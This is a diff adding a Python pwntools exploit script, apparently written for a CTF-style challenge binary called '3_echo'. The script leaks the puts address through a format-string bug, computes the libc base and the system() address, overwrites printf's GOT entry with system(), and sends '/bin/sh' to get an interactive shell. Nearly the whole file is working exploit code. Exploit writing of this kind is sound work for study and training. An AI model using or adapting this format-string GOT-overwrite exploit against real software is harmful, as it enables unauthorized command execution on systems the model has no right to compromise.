@@ -1,0 +1,89 @@
+#!/usr/bin/python
+
+from pwn import *
+
+p = process("./3_echo")
+
+def main():
+
+	# No Aslr: $2 = {<text variable, no debug info>} 0xf7e74ca0 <puts>
+
+	# 0804a014  00000307 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
+	puts_GOT = 0x0804a014
+
+	#fmt_str = "AAAA%57$p" 
+	fmt_leak = p32(puts_GOT) + "%57$s"
+
+	p.sendline(fmt_leak)			
+	skip_prompt()
+	repeat_once()
+
+	# hexdump ./dumpfile
+	leak = p.recv(8) # First 4 bytes: puts@GOT, Last 4 bytes: puts addr
+	leak = leak[4:]
+	puts_addr = u32(leak)
+	log.success("puts address : 0x%x" % puts_addr)
+
+	# hexdump dumpfile
+	# 0000000 4ca0 f7e7
+	fname = 'dumpfile' 
+	with open(fname, 'w') as f:
+		f.write(leak)
+
+	# Determine puts offset
+	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<_IO_puts@@GLIBC_2.0>:"
+	# 0005fca0 <_IO_puts@@GLIBC_2.0>:
+	puts_offset = 0x0005fca0
+
+	# Determine libc base addr
+	libc_base_addr = puts_addr - puts_offset
+	log.info("libc base addr : 0x%x" % libc_base_addr) 	
+
+	# No Aslr: $3 = {<text variable, no debug info>} 0xf7e4fda0 <system>
+
+	# Determine system offset
+	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<__libc_system@@GLIBC_PRIVATE>"
+	# 0003ada0 <__libc_system@@GLIBC_PRIVATE>:
+	system_offset = 0x0003ada0
+
+	# Determine system address
+	system_addr = libc_base_addr + system_offset	
+	log.info("system addr : 0x%x" % system_addr)
+
+	# For reference:
+	# payload = fmtstr_payload(5, {token_addr: 0xcafebabe})
+
+	# Printf GOT:
+	# 0804a010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
+	printf_GOT = 0x0804a010
+
+	# Overwrites printf() GOT with system()
+	fmt_write = fmtstr_payload(57, { printf_GOT: system_addr })
+	p.sendline(fmt_write)
+	log.warn("printf() overwritten with system()")
+	
+	skip_prompt()
+	repeat_once()
+
+	# For reference:
+	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<_IO_printf@@GLIBC_2.0>:"
+	# 00049670 <_IO_printf@@GLIBC_2.0>:
+
+	cmd = "/bin/sh".ljust(999, "\x00")
+	p.sendline(cmd)	
+
+	skip_prompt()
+	repeat_once()
+	log.success("Popped shell :)")
+
+	p.interactive()
+
+def skip_prompt():
+	time = 0.2 
+	p.recvrepeat(time)
+
+def repeat_once():
+	p.sendline("1")
+
+if __name__ == "__main__":
+	main()
